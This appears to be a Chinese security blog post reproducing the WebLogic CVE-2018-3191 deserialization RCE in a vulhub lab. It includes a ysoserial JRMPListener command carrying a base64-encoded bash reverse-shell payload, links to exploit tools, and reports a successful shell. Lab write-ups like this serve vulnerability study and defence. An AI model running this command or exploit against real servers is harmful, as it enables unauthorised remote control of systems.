---
layout: post
title: Weblogic 远程代码命令执行
tags: WebLogic
categories: CVE-2018-3191
---

# Weblogic 远程代码命令执行（CVE-2018-3191）

## 漏洞描述

该漏洞允许未经身份验证的攻击者通过T3协议网络访问并破坏易受攻击的WebLogic Server，成功的漏洞利用可导致WebLogic Server被攻击者接管，从而造成远程代码执行。

## 漏洞复现

环境部署是使用的GitHub中的[vulhub](!https://github.com/vulhub/vulhub.git)项目（CVE-2018-2628)docker一键部署的。
环境启动后，访问`http://your-ip:7001/console`，即可看到后台登录页面。

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2018-3191/15944600337497.jpg)

首先通过使用Nmap探测靶机Weblogic服务的相关信息，发现靶机的Weblogic开启了T3协议，且属于受CVE-2018-3191影响的版本范围，因此，存在着漏洞风险。

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2018-3191/15944597779594.jpg)

然后使用ysoserial工具在本地建立一个JRMPListener （批注：Java Remote Method Protocol，****Java远程消息交换协议。****是特定于Java技术的、用于查找和引用远程对象的协议。这是运行在RMI之下、TCP/IP之上的线路层协议），用于接收被攻击方的Weblogic请求，并执行指定的bash反弹命令。

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2018-3191/15944607811963.jpg)

命令后半段的bash命令进行了base64转码解码的操作，此举是为了避免Runtime.getRuntime().exec() 执行过程中将特殊符号转义

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2018-3191/15944608073364.jpg)

```
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections1 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcOTIuMT2758MiaMD4mMQ==}|{base64,-d}|{bash,-i}'
```

同时本地开启监听

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2018-3191/15944609275757.jpg)

然后执行[exp](https://github.com/Libraggbond/CVE-2018-3191/blob/master/exploit.py)，将生成的payload通过T3协议rmi发送给weblogic

其中[CVE-2018-3191 payload生成工具](https://github.com/pyn3rd/CVE-2018-3191)：weblogic-spring-jndi-12.2.1.3.jar 对于weblogic：12.2.1.3

weblogic-spring-jndi-10.3.6.0.jar 对于weblogic：10.3.6.0、12.2.1.0、12.1.3.0、12.2.1.1

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2018-3191/15944617461766.jpg)

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2018-3191/15944612239054.jpg)

可以看到攻击载核注入成功，nc监听收到反弹shell

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic/CVE-2018-3191/15944615964414.jpg)

## 受影响版本

10.3.6.0, 12.1.3.0 and 12.2.1.3

## 参考链接

https://www.jianshu.com/p/f73b162c4649

https://www.o2oxy.cn/2126.html